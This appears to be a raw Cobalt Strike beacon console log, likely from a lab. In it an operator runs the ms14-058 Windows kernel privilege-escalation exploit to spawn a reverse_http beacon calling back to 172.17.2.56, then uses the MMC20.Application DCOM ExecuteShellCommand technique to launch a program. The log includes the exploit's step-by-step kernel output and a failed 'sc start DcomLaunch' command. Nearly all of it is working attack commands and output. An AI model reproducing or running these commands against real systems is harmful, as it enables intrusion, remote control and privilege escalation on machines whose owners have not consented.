02/02 15:52:23 [metadata] 172.17.2.54 <- 172.17.2.54; computer: A-PC; user: a *; pid: 2752; os: Windows; version: 6.1; beacon arch: x86 (x64)
02/02 15:52:30 [input] <neo> elevate ms14-058 test
02/02 15:52:30 [task] Tasked beacon to run windows/beacon_http/reverse_http (172.17.2.56:80) via ms14-058
02/02 15:53:10 [task] Tasked beacon to run: sc start DcomLaunch
02/02 15:53:10 [task] Tasked beacon to run: $Com=[Activator]::CreateInstance([Type]::GetTypeFromProgID("MMC20.Application","localhost"));$Com.Document.ActiveView.ExecuteShellCommand("c:\windows\system32\calc.exe", $null, $null, "7")
02/02 15:53:16 [checkin] host called home, sent: 105120 bytes
02/02 15:53:18 [output]
received output:
[*] Getting Windows version...
[*] Solving symbols...
[*] Requesting Kernel loaded modules...
[*] pZwQuerySystemInformation required length 43224
[*] Parsing SYSTEM_INFO...
[*] 146 Kernel modules found
[*] Checking module \SystemRoot\system32\ntoskrnl.exe
[*] Good! nt found as ntoskrnl.exe at 0x03c4c000
[*] ntoskrnl.exe loaded in userspace at: 40000000
[*] pPsLookupProcessByProcessId in kernel: 0xFFFFF80003F9F1FC
[*] pPsReferencePrimaryToken in kernel: 0xFFFFF80003FA29D0
[*] Registering class...
[*] Creating window...
[*] Allocating null page...
[*] Getting PtiCurrent...
[*] Good! dwThreadInfoPtr 0xFFFFF900C2993C30
[*] Creating a fake structure at NULL...
[*] Triggering vulnerability...
[!] Executing payload...


02/02 15:53:18 [output]
received output:
[SC] StartService 失败 1056:

服务的实例已在运行中。



